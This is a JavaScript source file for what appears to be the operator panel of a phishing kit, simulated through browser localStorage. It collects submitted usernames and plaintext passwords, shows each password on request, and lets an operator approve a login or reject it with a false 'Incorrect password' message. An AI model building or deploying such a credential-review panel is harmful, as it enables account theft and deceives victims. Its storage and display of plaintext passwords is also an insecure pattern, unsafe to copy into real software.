document.addEventListener('DOMContentLoaded', function() {
    // Set current year in footer
    document.getElementById('currentYear').textContent = new Date().getFullYear();
    
    // Initialize login requests from local storage or create empty array
    let loginRequests = JSON.parse(localStorage.getItem('loginRequests')) || [];
    
    // Update stats
    updateStats();
    
    // Render login requests
    renderLoginRequests();
    
    // Add event listeners for filter buttons
    document.querySelectorAll('.filter-btn').forEach(button => {
        button.addEventListener('click', function() {
            // Remove active class from all buttons
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Add active class to clicked button
            this.classList.add('active');
            
            // Filter requests
            const filter = this.getAttribute('data-filter');
            filterLoginRequests(filter);
        });
    });
    
    // Listen for new login attempts
    window.addEventListener('storage', function(e) {
        if (e.key === 'pendingLogin' || e.key === 'loginRequests') {
            // Reload login requests from local storage
            loginRequests = JSON.parse(localStorage.getItem('loginRequests')) || [];
            
            // Update UI
            updateStats();
            renderLoginRequests();
        }
    });
    
    // Check for pending login when page loads
    checkPendingLogin();
    
    // Poll for new login attempts every 2 seconds (simulating real-time updates)
    setInterval(checkPendingLogin, 2000);
    
    /**
     * Check if there's a pending login to process
     */
    function checkPendingLogin() {
        const pendingLogin = JSON.parse(localStorage.getItem('pendingLogin'));
        
        if (pendingLogin) {
            // Add to login requests
            const requestId = Date.now().toString();
            const request = {
                id: requestId,
                username: pendingLogin.username,
                password: pendingLogin.password,
                timestamp: new Date().toISOString(),
                status: 'pending',
                ipAddress: '127.0.0.1' // In a real app, this would be the actual IP
            };
            
            loginRequests.unshift(request);
            
            // Save to local storage
            localStorage.setItem('loginRequests', JSON.stringify(loginRequests));
            
            // Clear pending login
            localStorage.removeItem('pendingLogin');
            
            // Update UI
            updateStats();
            renderLoginRequests();
            
            // Show notification
            notifyNewLogin(request);
        }
    }
    
    /**
     * Update statistics display
     */
    function updateStats() {
        const total = loginRequests.length;
        const pending = loginRequests.filter(req => req.status === 'pending').length;
        const approved = loginRequests.filter(req => req.status === 'approved').length;
        const rejected = loginRequests.filter(req => req.status === 'rejected').length;
        
        document.getElementById('totalRequests').textContent = total;
        document.getElementById('pendingRequests').textContent = pending;
        document.getElementById('approvedRequests').textContent = approved;
        document.getElementById('rejectedRequests').textContent = rejected;
    }
    
    /**
     * Render login requests in the UI
     */
    function renderLoginRequests() {
        const container = document.getElementById('loginRequestsContainer');
        const emptyState = document.getElementById('emptyState');
        
        // Clear existing requests (except empty state)
        Array.from(container.children).forEach(child => {
            if (child !== emptyState) {
                container.removeChild(child);
            }
        });
        
        // Show or hide empty state
        if (loginRequests.length === 0) {
            emptyState.style.display = 'block';
            return;
        } else {
            emptyState.style.display = 'none';
        }
        
        // Get current filter
        const activeFilter = document.querySelector('.filter-btn.active').getAttribute('data-filter');
        
        // Filter requests based on active filter
        let filteredRequests = loginRequests;
        if (activeFilter !== 'all') {
            filteredRequests = loginRequests.filter(req => req.status === activeFilter);
        }
        
        // Render each request
        filteredRequests.forEach(request => {
            const requestCard = createRequestCard(request);
            container.appendChild(requestCard);
        });
    }
    
    /**
     * Create a login request card element
     */
    function createRequestCard(request) {
        // Clone template
        const template = document.getElementById('loginRequestTemplate');
        const card = document.importNode(template.content, true).querySelector('.login-request-card');
        
        // Set data attributes
        card.setAttribute('data-request-id', request.id);
        card.setAttribute('data-status', request.status);
        
        // Fill in user info
        const avatar = card.querySelector('.user-avatar');
        avatar.textContent = request.username.charAt(0).toUpperCase();
        
        const username = card.querySelector('.request-info h3');
        username.textContent = request.username;
        
        const timestamp = card.querySelector('.timestamp');
        timestamp.textContent = formatDate(new Date(request.timestamp));
        
        // Set status badge
        const statusBadge = card.querySelector('.status-badge');
        statusBadge.className = `status-badge ${request.status}`;
        statusBadge.textContent = capitalizeFirstLetter(request.status);
        
        // Fill in details
        card.querySelector('.username-display').textContent = request.username;
        
        const passwordDisplay = card.querySelector('.password-display');
        passwordDisplay.textContent = '•'.repeat(request.password.length);
        passwordDisplay.setAttribute('data-password', request.password);
        
        card.querySelector('.login-time').textContent = formatDate(new Date(request.timestamp));
        card.querySelector('.ip-address').textContent = request.ipAddress;
        
        // Add event listener for password toggle
        const togglePasswordBtn = card.querySelector('.toggle-password');
        togglePasswordBtn.addEventListener('click', function() {
            const icon = this.querySelector('i');
            const passwordValue = passwordDisplay.getAttribute('data-password');
            
            if (passwordDisplay.textContent === '•'.repeat(passwordValue.length)) {
                // Show password
                passwordDisplay.textContent = passwordValue;
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                // Hide password
                passwordDisplay.textContent = '•'.repeat(passwordValue.length);
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        });
        
        // Add event listeners for action buttons
        const approveBtn = card.querySelector('.approve-btn');
        const rejectBtn = card.querySelector('.reject-btn');
        
        // Disable buttons if the request is already approved or rejected
        if (request.status !== 'pending') {
            approveBtn.disabled = true;
            rejectBtn.disabled = true;
            approveBtn.style.opacity = '0.5';
            rejectBtn.style.opacity = '0.5';
        }
        
        approveBtn.addEventListener('click', function() {
            handleRequestAction(request.id, 'approved', 'Credentials verified successfully.');
        });
        
        rejectBtn.addEventListener('click', function() {
            handleRequestAction(request.id, 'rejected', 'Incorrect password.');
        });
        
        return card;
    }
    
    /**
     * Handle approve or reject action
     */
    function handleRequestAction(requestId, action, reason) {
        // Find the request
        const requestIndex = loginRequests.findIndex(req => req.id === requestId);
        
        if (requestIndex === -1) return;
        
        // Update the request status
        loginRequests[requestIndex].status = action;
        loginRequests[requestIndex].reason = reason;
        loginRequests[requestIndex].actionTime = new Date().toISOString();
        
        // Save to local storage
        localStorage.setItem('loginRequests', JSON.stringify(loginRequests));
        
        // Update the login result in local storage
        localStorage.setItem('loginResult', JSON.stringify({
            requestId: requestId,
            status: action,
            reason: reason,
            username: loginRequests[requestIndex].username,
            timestamp: new Date().toISOString()
        }));
        
        // Update UI
        updateStats();
        renderLoginRequests();
        
        // Show confirmation message
        const confirmationMessage = action === 'approved' 
            ? 'Login approved. User will be redirected to dashboard.'
            : 'Login rejected. User will be notified that the password is incorrect.';
            
        showConfirmationMessage(confirmationMessage, action);
    }
    
    /**
     * Show a temporary confirmation message
     */
    function showConfirmationMessage(message, type) {
        // Create message element if it doesn't exist
        if (!document.getElementById('admin-confirmation')) {
            const messageElement = document.createElement('div');
            messageElement.id = 'admin-confirmation';
            messageElement.style.position = 'fixed';
            messageElement.style.bottom = '20px';
            messageElement.style.right = '20px';
            messageElement.style.padding = '12px 20px';
            messageElement.style.borderRadius = '4px';
            messageElement.style.color = 'white';
            messageElement.style.fontWeight = '500';
            messageElement.style.zIndex = '1000';
            messageElement.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.1)';
            messageElement.style.minWidth = '250px';
            
            document.body.appendChild(messageElement);
        }
        
        const messageElement = document.getElementById('admin-confirmation');
        messageElement.textContent = message;
        messageElement.style.backgroundColor = type === 'approved' ? '#0e7f41' : '#b42a37';
        messageElement.style.display = 'block';
        
        // Hide after 3 seconds
        setTimeout(() => {
            messageElement.style.display = 'none';
        }, 3000);
    }
    
    /**
     * Filter login requests based on status
     */
    function filterLoginRequests(filter) {
        renderLoginRequests();
    }
    
    /**
     * Format date to readable string
     */
    function formatDate(date) {
        return date.toLocaleString();
    }
    
    /**
     * Capitalize first letter of a string
     */
    function capitalizeFirstLetter(string) {
        return string.charAt(0).toUpperCase() + string.slice(1);
    }
    
    /**
     * Display a notification for new login
     */
    function notifyNewLogin(request) {
        // In a real app, this would show a popup notification
        console.log('New login request:', request);
        
        // Flash the pending count to draw attention
        const pendingCount = document.getElementById('pendingRequests');
        pendingCount.style.color = '#ed4956';
        
        setTimeout(() => {
            pendingCount.style.color = '';
        }, 1000);
    }
}); 